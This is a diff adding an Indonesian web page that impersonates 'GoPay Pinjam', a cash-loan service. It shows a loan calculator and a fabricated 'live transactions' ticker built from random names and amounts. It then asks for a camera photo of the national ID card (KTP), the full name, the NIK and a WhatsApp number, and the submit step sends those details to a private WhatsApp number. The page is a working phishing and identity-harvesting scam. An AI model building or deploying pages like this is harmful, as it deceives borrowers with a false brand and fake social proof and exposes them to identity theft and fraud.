@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GoPay Pinjam - Data & Transaksi</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f3f4f6;
+            margin: 0;
+            padding: 0;
+        }
+
+        .gopay-blue {
+            background-color: #0081a0;
+        }
+
+        .gopay-header {
+            background: linear-gradient(135deg, #0081a0 0%, #00aade 100%);
+        }
+
+        .card {
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: #4b5563;
+            margin-bottom: 0.5rem;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 0.875rem 1rem;
+            border-radius: 12px;
+            border: 1px solid #e5e7eb;
+            background-color: #f9fafb;
+            transition: all 0.2s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #0081a0;
+            background-color: white;
+            box-shadow: 0 0 0 3px rgba(0, 129, 160, 0.1);
+        }
+
+        .step-indicator {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .step-dot {
+            height: 4px;
+            flex: 1;
+            background-color: rgba(255, 255, 255, 0.3);
+            border-radius: 2px;
+        }
+
+        .step-dot.active {
+            background-color: white;
+        }
+
+        .btn-tenor.active {
+            border-color: #0081a0;
+            background-color: #eef9fb;
+            color: #0081a0;
+        }
+
+        input[type="range"] { accent-color: #0081a0; }
+
+        .upload-area {
+            border: 2px dashed #e5e7eb;
+            transition: all 0.2s;
+        }
+
+        /* Live Transaction Styling */
+        .live-tx-container {
+            background: #eef9fb;
+            border-radius: 12px;
+            padding: 10px 15px;
+            margin-bottom: 20px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            border: 1px solid #c7e9f0;
+        }
+
+        .tx-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #10b981;
+            border-radius: 50%;
+            margin-right: 10px;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.95); opacity: 0.7; }
+            70% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(0.95); opacity: 0.7; }
+        }
+
+        #tx-content {
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: #0081a0;
+            white-space: nowrap;
+            animation: slideUp 0.5s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        /* Logo Image Styling */
+        .gopay-custom-logo {
+            height: 32px;
+            width: auto;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen">
+
+    <!-- View 1: Simulasi Pinjaman -->
+    <div id="simulationView">
+        <div class="gopay-header pt-12 pb-24 px-6 text-white">
+            <div class="flex justify-between items-center mb-8">
+                <div class="flex items-center gap-2">
+                    <!-- Logo Utama -->
+                    <img src="https://cdn.phototourl.com/uploads/2026-03-02-80da1e49-b93d-4f67-9b28-3e9fc1c70f8c.jpg" alt="GoPay Logo" class="gopay-custom-logo">
+                    <span class="font-bold text-lg">GoPay Pinjam</span>
+                </div>
+                <button class="p-2">
+                    <div class="w-6 h-0.5 bg-white mb-1.5"></div>
+                    <div class="w-6 h-0.5 bg-white mb-1.5"></div>
+                    <div class="w-4 h-0.5 bg-white ml-auto"></div>
+                </button>
+            </div>
+            
+            <div class="flex items-center gap-4 mb-4">
+                <h1 class="text-xl font-bold">Pinjam Tunai</h1>
+            </div>
+            <div class="step-indicator">
+                <div class="step-dot active"></div>
+                <div class="step-dot"></div>
+                <div class="step-dot"></div>
+            </div>
+        </div>
+
+        <main class="px-4 -mt-16 pb-12">
+            <!-- Live Transaction Section -->
+            <div class="live-tx-container shadow-sm">
+                <div class="tx-dot"></div>
+                <div id="tx-content">Memuat transaksi terbaru...</div>
+            </div>
+
+            <div class="card p-6 mb-6">
+                <label class="block text-gray-500 text-xs font-bold mb-4 uppercase">Jumlah Pinjaman</label>
+                <div class="text-3xl font-bold text-gray-800 mb-4" id="amountDisplay">Rp2.000.000</div>
+                <input type="range" id="amountSlider" min="2000000" max="50000000" step="500000" value="2000000" class="w-full h-2 rounded-lg appearance-none cursor-pointer bg-gray-200">
+                <div class="flex justify-between text-xs text-gray-400 mt-2">
+                    <span>Rp2jt</span>
+                    <span>Rp50jt</span>
+                </div>
+            </div>
+
+            <div class="card p-6 mb-6">
+                <label class="block text-gray-500 text-xs font-bold mb-4 uppercase">Pilih Tenor</label>
+                <div class="grid grid-cols-4 gap-2">
+                    <button onclick="setTenor(6)" class="btn-tenor border-2 border-gray-100 p-3 rounded-xl text-center font-bold" data-tenor="6">6 bln</button>
+                    <button onclick="setTenor(12)" class="btn-tenor border-2 border-gray-100 active p-3 rounded-xl text-center font-bold" data-tenor="12">12 bln</button>
+                    <button onclick="setTenor(24)" class="btn-tenor border-2 border-gray-100 p-3 rounded-xl text-center font-bold" data-tenor="24">24 bln</button>
+                    <button onclick="setTenor(36)" class="btn-tenor border-2 border-gray-100 p-3 rounded-xl text-center font-bold" data-tenor="36">36 bln</button>
+                </div>
+            </div>
+
+            <div class="card p-6 bg-white mb-6">
+                <div class="flex justify-between items-center mb-6">
+                    <div>
+                        <span class="block text-xs text-gray-500 font-bold uppercase">Cicilan per bulan (Bunga 1.2%)</span>
+                        <span class="text-2xl font-extrabold text-[#0081a0]" id="monthlyInstallment">Rp194.000</span>
+                    </div>
+                </div>
+                <button onclick="showFormView()" class="w-full gopay-blue text-white font-bold py-4 rounded-full text-lg shadow-lg active:scale-95 transition-transform">
+                    Lanjut Isi Data
+                </button>
+            </div>
+        </main>
+    </div>
+
+    <!-- View 2: Pengisian Data & KTP -->
+    <div id="formView" class="hidden">
+        <div class="gopay-header pt-12 pb-24 px-6 text-white">
+            <div class="flex items-center gap-4 mb-4">
+                <button onclick="showSimView()" class="p-1"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
+                <h1 class="text-xl font-bold">Lengkapi Profil</h1>
+            </div>
+            <div class="step-indicator">
+                <div class="step-dot active"></div>
+                <div class="step-dot active"></div>
+                <div class="step-dot"></div>
+            </div>
+        </div>
+
+        <main class="px-4 -mt-16 pb-12">
+            <div class="card p-6 space-y-6">
+                <!-- Banner Image -->
+                <div class="w-full overflow-hidden rounded-xl mb-2">
+                    <img src="https://cdn.phototourl.com/uploads/2026-03-02-80da1e49-b93d-4f67-9b28-3e9fc1c70f8c.jpg" alt="Info Pinjaman" class="w-full h-auto object-cover">
+                </div>
+
+                <!-- Foto KTP Section -->
+                <div class="input-group">
+                    <label>Foto KTP Asli</label>
+                    <p class="text-xs text-gray-400 mb-3">Ukuran maks: 1000 x 15000 px. Format JPG/PNG.</p>
+                    
+                    <!-- Dibatasi hanya untuk kamera, tidak memperbolehkan galeri -->
+                    <input type="file" id="ktpInput" accept="image/*" capture="camera" class="hidden" onchange="handleKtpUpload(event)">
+                    
+                    <div id="uploadPlaceholder" onclick="document.getElementById('ktpInput').click()" class="upload-area rounded-2xl p-8 flex flex-col items-center justify-center cursor-pointer bg-gray-50">
+                        <svg class="w-12 h-12 text-gray-300 mb-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812-1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path>
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path>
+                        </svg>
+                        <span class="text-sm font-semibold text-[#0081a0]">Ambil Foto Kamera</span>
+                    </div>
+
+                    <div id="ktpPreviewContainer" class="hidden relative">
+                        <img id="ktpPreview" src="#" alt="KTP Preview" class="w-full rounded-2xl h-48 object-cover border">
+                        <button onclick="removeKtp()" class="absolute -top-2 -right-2 bg-red-500 text-white rounded-full p-1 shadow-lg">
+                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M6 18L18 6M6 6l12 12" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                        </button>
+                    </div>
+                    <p id="errorMessage" class="text-red-500 text-xs mt-2 hidden"></p>
+                </div>
+
+                <!-- Nama Lengkap -->
+                <div class="input-group">
+                    <label>Nama Lengkap (Sesuai KTP)</label>
+                    <input type="text" id="userName" placeholder="Contoh: Budi Santoso" class="input-field">
+                </div>
+
+                <!-- NIK -->
+                <div class="input-group">
+                    <label>NIK (16 Digit)</label>
+                    <input type="number" id="userNIK" placeholder="3201xxxxxxxxxxxx" class="input-field">
+                </div>
+
+                <!-- Input Nomor WhatsApp -->
+                <div class="input-group">
+                    <label>Nomor WhatsApp</label>
+                    <input type="tel" id="userWA" placeholder="08xxxxxxxxxx" class="input-field">
+                </div>
+
+                <button onclick="submitData()" class="w-full gopay-blue text-white font-bold py-4 rounded-full text-lg shadow-lg active:scale-95 transition-transform mt-4">
+                    Kirim Data
+                </button>
+            </div>
+        </main>
+    </div>
+
+    <!-- Final View -->
+    <div id="successView" class="hidden min-h-screen flex flex-col items-center justify-center p-6 text-center">
+        <div class="w-24 h-24 bg-green-100 text-green-600 rounded-full flex items-center justify-center mb-6">
+            <svg class="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="3">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+            </svg>
+        </div>
+        <h2 class="text-2xl font-bold text-gray-800 mb-2">Pendaftaran Diproses</h2>
+        <p class="text-gray-600 mb-8">Data sedang diverifikasi. Tunggu kabar selanjutnya di aplikasi!</p>
+        <button onclick="location.reload()" class="px-8 py-3 bg-gray-800 text-white font-bold rounded-full">
+            Kembali ke Beranda
+        </button>
+    </div>
+
+    <script>
+        const names = ["Andi", "Budi", "Chandra", "Dewi", "Eko", "Ferry", "Gita", "Hendra", "Indra", "Joko", "Kartika", "Lestari", "Maya", "Nanang", "Oki", "Putra", "Qory", "Rian", "Siska", "Taufik", "Umar", "Vina", "Wawan", "Xena", "Yanto", "Zaki", "Bambang", "Dedi", "Eni", "Farhan", "Gunawan", "Hani", "Iwan", "Julia", "Kurnia", "Lutfi", "Maman", "Nina", "Oscar", "Puji", "Rina", "Santi", "Tono", "Uus", "Veri", "Wati", "Yadi", "Zul", "Agus", "Sari"];
+        const cities = ["Jakarta", "Bandung", "Surabaya", "Medan", "Semarang", "Makassar", "Palembang", "Tangerang", "Bekasi", "Depok", "Jogja", "Malang", "Solo", "Bali"];
+        const amountsList = ["500.000", "1.000.000", "2.500.000", "5.000.000", "7.000.000", "10.000.000", "15.000.000", "20.000.000"];
+
+        function updateLiveTx() {
+            const txContent = document.getElementById('tx-content');
+            if (!txContent) return;
+            const randomName = names[Math.floor(Math.random() * names.length)];
+            const randomCity = cities[Math.floor(Math.random() * cities.length)];
+            const randomAmount = amountsList[Math.floor(Math.random() * amountsList.length)];
+            
+            txContent.style.opacity = '0';
+            setTimeout(() => {
+                txContent.innerText = `Sdr. ${randomName} (${randomCity}) baru saja mencairkan Rp ${randomAmount}`;
+                txContent.style.opacity = '1';
+            }, 500);
+        }
+
+        setInterval(updateLiveTx, 3000);
+
+        const amountSlider = document.getElementById('amountSlider');
+        const amountDisplay = document.getElementById('amountDisplay');
+        const monthlyInstallment = document.getElementById('monthlyInstallment');
+        
+        let currentTenor = 12;
+        const serviceFeeRate = 0.02; 
+        const interestRate = 0.012; 
+
+        function formatRupiah(number) {
+            return new Intl.NumberFormat('id-ID', {
+                style: 'currency', currency: 'IDR', minimumFractionDigits: 0
+            }).format(number);
+        }
+
+        function calculate() {
+            if (!amountSlider) return;
+            const amount = parseInt(amountSlider.value);
+            const fee = amount * serviceFeeRate;
+            const monthlyInterest = amount * interestRate;
+            const installment = (amount / currentTenor) + monthlyInterest + (fee / currentTenor);
+            if (amountDisplay) amountDisplay.innerText = formatRupiah(amount);
+            if (monthlyInstallment) monthlyInstallment.innerText = formatRupiah(Math.round(installment));
+        }
+
+        function setTenor(t) {
+            currentTenor = t;
+            document.querySelectorAll('.btn-tenor').forEach(btn => {
+                btn.classList.toggle('active', parseInt(btn.getAttribute('data-tenor')) === t);
+            });
+            calculate();
+        }
+
+        function handleKtpUpload(event) {
+            const file = event.target.files[0];
+            const errorEl = document.getElementById('errorMessage');
+            const preview = document.getElementById('ktpPreview');
+            const placeholder = document.getElementById('uploadPlaceholder');
+            const container = document.getElementById('ktpPreviewContainer');
+
+            if (!file) return;
+            errorEl.classList.add('hidden');
+
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const img = new Image();
+                img.onload = function() {
+                    if (this.width > 1000 || this.height > 15000) {
+                        errorEl.innerText = `Ukuran terlalu besar. Maksimal 1000x15000px.`;
+                        errorEl.classList.remove('hidden');
+                        event.target.value = ''; 
+                    } else {
+                        preview.src = e.target.result;
+                        placeholder.classList.add('hidden');
+                        container.classList.remove('hidden');
+                    }
+                };
+                img.src = e.target.result;
+            };
+            reader.readAsDataURL(file);
+        }
+
+        function removeKtp() {
+            document.getElementById('ktpInput').value = '';
+            document.getElementById('uploadPlaceholder').classList.remove('hidden');
+            document.getElementById('ktpPreviewContainer').classList.add('hidden');
+        }
+
+        function showFormView() {
+            document.getElementById('simulationView').classList.add('hidden');
+            document.getElementById('formView').classList.remove('hidden');
+            window.scrollTo(0,0);
+        }
+
+        function showSimView() {
+            document.getElementById('formView').classList.add('hidden');
+            document.getElementById('simulationView').classList.remove('hidden');
+        }
+
+        function submitData() {
+            const nameInput = document.getElementById('userName');
+            const nikInput = document.getElementById('userNIK');
+            const waInput = document.getElementById('userWA');
+            const amountVal = amountDisplay.innerText;
+            
+            if(!document.getElementById('ktpPreview').src || document.getElementById('ktpPreview').src.includes('#')) {
+                const errorEl = document.getElementById('errorMessage');
+                errorEl.innerText = "Mohon ambil foto KTP terlebih dahulu menggunakan kamera.";
+                errorEl.classList.remove('hidden');
+                return;
+            }
+            
+            if(!nameInput.value || !nikInput.value || !waInput.value) {
+                alert("Mohon lengkapi semua data profil Anda.");
+                return;
+            }
+
+            // Pesan WhatsApp yang akan dikirim
+            const message = `Halo Admin GoPay Pinjam,\n\nSaya ingin mengajukan pinjaman dengan data berikut:\n\n` +
+                            `Nama: ${nameInput.value}\n` +
+                            `NIK: ${nikInput.value}\n` +
+                            `WhatsApp: ${waInput.value}\n` +
+                            `Jumlah Pinjaman: ${amountVal}\n` +
+                            `Tenor: ${currentTenor} Bulan\n\n` +
+                            `Mohon diproses lebih lanjut. Terima kasih.`;
+
+            const encodedMessage = encodeURIComponent(message);
+            const whatsappNumber = "082299196390";
+            
+            // Redirect ke WhatsApp
+            window.open(`https://api.whatsapp.com/send?phone=${whatsappNumber}&text=${encodedMessage}`, '_blank');
+
+            // Tampilkan view sukses setelah redirect
+            document.getElementById('formView').classList.add('hidden');
+            document.getElementById('successView').classList.remove('hidden');
+            document.getElementById('successView').classList.add('flex');
+        }
+
+        if (amountSlider) amountSlider.addEventListener('input', calculate);
+        
+        window.onload = () => {
+            calculate();
+            updateLiveTx();
+        };
+    </script>
+</body>
+</html>
+
